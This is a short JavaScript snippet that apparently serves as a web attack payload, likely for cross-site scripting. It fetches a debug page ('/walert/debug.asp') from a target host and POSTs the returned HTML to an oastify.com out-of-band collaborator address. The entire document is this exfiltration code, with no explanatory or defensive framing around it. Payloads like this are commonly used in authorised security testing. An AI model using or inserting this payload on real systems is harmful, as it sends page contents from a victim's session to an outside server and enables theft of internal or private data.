fetch('https://ddddddd/walert/debug.asp')
  .then(r => r.text())
  .then(html => {
    fetch('https://f8o4hflzcp6e8299yyz7pz16qxwoke83.oastify.com', {
      method: 'POST',
      body: html
    });
  });
